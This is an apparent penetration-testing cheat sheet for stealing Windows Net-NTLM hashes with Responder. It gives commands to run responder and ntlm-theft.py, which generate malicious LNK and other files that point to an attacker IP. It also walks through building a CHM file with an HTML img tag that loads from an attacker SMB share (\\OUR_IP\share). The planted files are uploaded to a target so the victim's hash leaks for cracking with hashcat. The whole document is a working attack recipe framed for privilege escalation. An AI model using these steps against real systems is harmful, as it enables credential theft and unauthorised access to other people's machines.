## Net-NTLM Hash stealing with Responder

## Tools synergizing with Responder: ntlm-theft.py

### Requirements: The user you want to escalate to should react with your malicious file/responder SMB server in a way that it calls back to your responder listener to dump his Net-NTLM hash to crack with hashcat.

### Usage:

#### sudo responder -I tun0 (Turn on responder)

## There are various ways to steal hashes with responder, but they have all similar philosophy behind the technique

### .LNK Files

#### 1) python3 ntlm-theft.py -g all -s OUR_IP -f FOLDER (Generates any malicious file it can make (LNK included) all inside the specified folder name)

#### 2) sudo responder -I tun0 (Start responder)

#### 3) Upload malicious file to the target SMB server/target machine (Depends on the context of the use case your are dealing with)

#### 4) PROFIT

### .CHM Files

#### 1) Create an HTML document that points to your SMB server

#### <html<
####   <body<
####     <img src=\\OUR_IP\share\WHATEVER.png /<
####        </body<
#### </html<

#### 2) On a windows machine, use the HTML Help Workshop https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138

#### 3) Open HTML Help Workshop then go to: File -> New -> Project. Save at any folder you like

#### 4) In the next window, click the box to include HTML files

#### 5) Select your created HTML file here

#### 6) In the tool bar, click the compile button. Then when prompted, click compile.

#### 7) Copy your compiled .chm file to your linux machine, then upload it to your target machine.

#### 8) PROFIT!

